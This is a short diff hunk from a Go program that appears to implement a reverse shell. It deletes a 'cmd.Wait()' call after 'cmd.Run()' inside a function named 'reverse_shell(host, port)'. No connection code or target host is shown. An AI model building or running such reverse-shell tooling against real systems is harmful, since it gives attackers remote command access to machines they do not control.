@@ -28,9 +28,6 @@ func reverse_shell(host string, port string) {
 
 	// Start connection
 	cmd.Run()
-
-	// Wait for process
-	cmd.Wait()
 }
 
 func main() {
